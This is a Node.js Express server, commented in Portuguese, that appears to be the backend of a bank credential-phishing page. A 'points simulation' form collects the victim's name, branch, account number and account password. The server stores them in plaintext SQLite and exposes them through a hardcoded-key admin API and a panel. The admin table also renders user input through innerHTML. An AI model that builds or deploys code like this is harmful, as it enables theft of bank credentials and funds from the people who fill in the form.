const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();

const app = express();
const PORTA = 3000;
const CHAVE_ADMIN = 'minha-senha-admin-2026';

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const db = new sqlite3.Database('./banco.db', (erro) => {
  if (erro) {
    console.error('Erro ao abrir o banco:', erro.message);
  } else {
    console.log('Conectado ao banco de dados SQLite.');
  }
});

// Criação da tabela atualizada (sem whatsapp e com senha)
db.run(`
  CREATE TABLE IF NOT EXISTS simulacoes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    nome TEXT NOT NULL,
    agencia TEXT NOT NULL,
    conta TEXT NOT NULL,
    senha TEXT NOT NULL,
    valor_fatura REAL NOT NULL,
    pontos_calculados INTEGER NOT NULL,
    data_criacao DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// Rota POST para salvar os dados do formulário (index.html)
app.post('/api/simulacoes', (req, res) => {
  const { nome, agencia, conta, senha, valorFatura } = req.body;

  if (!nome || !agencia || !conta || !senha || !valorFatura || valorFatura <= 0) {
    return res.status(400).json({ erro: 'Preencha todos os campos corretamente.' });
  }

  const pontosCalculados = Math.floor(Number(valorFatura) * 2);

  const sql = `
    INSERT INTO simulacoes (nome, agencia, conta, senha, valor_fatura, pontos_calculados)
    VALUES (?, ?, ?, ?, ?, ?)
  `;

  db.run(sql, [nome, agencia, conta, senha, valorFatura, pontosCalculados], function (erro) {
    if (erro) {
      return res.status(500).json({ erro: 'Erro ao salvar no banco: ' + erro.message });
    }

    return res.status(201).json({
      mensagem: 'Simulação registrada com sucesso!',
      id: this.lastID,
      pontosCalculados
    });
  });
});

// Rota GET da API que consulta os dados no SQLite
app.get('/api/simulacoes', (req, res) => {
  const chaveRecebida = req.headers['x-admin-key'];

  if (chaveRecebida !== CHAVE_ADMIN) {
    return res.status(401).json({ erro: 'Acesso não autorizado.' });
  }

  db.all('SELECT * FROM simulacoes ORDER BY id DESC', [], (erro, linhas) => {
    if (erro) {
      return res.status(500).json({ erro: 'Erro ao buscar registros.' });
    }
    return res.json(linhas);
  });
});

// Rota GET que entrega a página visual do Painel Administrativo
app.get('/admin', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8" />
      <title>Painel Administrativo</title>
      <style>
        body { font-family: Arial, sans-serif; background: #f4f6f8; padding: 30px; }
        .box { max-width: 900px; margin: auto; background: #fff; padding: 24px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { margin-top: 0; }
        .login-bar { display: flex; gap: 10px; margin-bottom: 20px; }
        input { padding: 10px; border: 1px solid #ccc; border-radius: 5px; flex: 1; }
        button { padding: 10px 18px; background: #0066cc; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #0052a3; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { padding: 10px; border-bottom: 1px solid #ddd; text-align: left; font-size: 14px; }
        th { background-color: #f0f2f5; }
        #erro { color: red; font-weight: bold; }
      </style>
    </head>
    <body>
      <div class="box">
        <h2>Registros de Simulações</h2>
        <div class="login-bar">
          <input type="password" id="chaveAdmin" placeholder="Digite a chave de administrador" />
          <button onclick="carregarRegistros()">Carregar Dados</button>
        </div>
        <p id="erro"></p>
        <table>
          <thead>
            <tr>
              <th>ID</th>
              <th>Nome</th>
              <th>Agência</th>
              <th>Conta</th>
              <th>Fatura (R$)</th>
              <th>Pontos</th>
              <th>Data</th>
            </tr>
          </thead>
          <tbody id="tabelaCorpo"></tbody>
        </table>
      </div>

      <script>
        async function carregarRegistros() {
          const chave = document.getElementById('chaveAdmin').value;
          const erroEl = document.getElementById('erro');
          const corpo = document.getElementById('tabelaCorpo');
          erroEl.textContent = '';
          corpo.innerHTML = '';

          const resposta = await fetch('/api/simulacoes', {
            headers: { 'x-admin-key': chave }
          });

          const dados = await resposta.json();

          if (!resposta.ok) {
            erroEl.textContent = dados.erro || 'Erro ao acessar.';
            return;
          }

          dados.forEach(item => {
            const tr = document.createElement('tr');
            tr.innerHTML = '<td>' + item.id + '</td>' +
                           '<td>' + item.nome + '</td>' +
                           '<td>' + item.agencia + '</td>' +
                           '<td>' + item.conta + '</td>' +
                           '<td>R$ ' + Number(item.valor_fatura).toFixed(2) + '</td>' +
                           '<td>' + item.pontos_calculados + '</td>' +
                           '<td>' + item.data_criacao + '</td>';
            corpo.appendChild(tr);
          });
        }
      </script>
    </body>
    </html>
  `);
});

app.listen(PORTA, () => {
  console.log('Servidor rodando em http://localhost:' + PORTA);
});